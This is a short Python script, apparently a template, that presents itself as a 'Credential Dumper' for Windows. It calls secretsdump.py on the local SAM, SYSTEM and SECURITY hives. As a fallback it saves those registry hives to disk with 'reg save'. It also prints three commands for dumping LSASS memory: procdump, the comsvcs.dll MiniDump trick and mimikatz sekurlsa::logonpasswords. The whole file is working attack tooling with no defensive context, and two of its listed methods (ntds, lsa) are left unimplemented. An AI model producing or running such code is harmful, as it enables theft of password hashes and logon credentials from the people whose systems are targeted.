import subprocess
import sys
import os

METHOD = '{method}'  # lsass, sam, ntds, lsa

def dump_sam():
    print('[*] Dumping SAM database')
    try:
        result = subprocess.run(['secretsdump.py', '-sam', 'SAM', '-system', 'SYSTEM', '-security', 'SECURITY', 'LOCAL'], capture_output=True, text=True, timeout=60)
        return result.stdout
    except FileNotFoundError:
        # Try reg save method
        cmds = ['reg save HKLM\\SAM sam.save', 'reg save HKLM\\SYSTEM system.save', 'reg save HKLM\\SECURITY security.save']
        for cmd in cmds:
            subprocess.run(cmd.split(), capture_output=True)
        return 'Registry hives saved to current directory'

def dump_lsass():
    print('[*] LSASS dump methods:')
    print('  1. procdump -ma lsass.exe lsass.dmp')
    print('  2. rundll32 comsvcs.dll MiniDump <PID> lsass.dmp full')
    print('  3. mimikatz: sekurlsa::logonpasswords')
    return 'Select method based on available tools'

print(f'=== Credential Dumper ===')
print(f'Method: {METHOD}')
if METHOD == 'sam': print(dump_sam())
elif METHOD == 'lsass': print(dump_lsass())
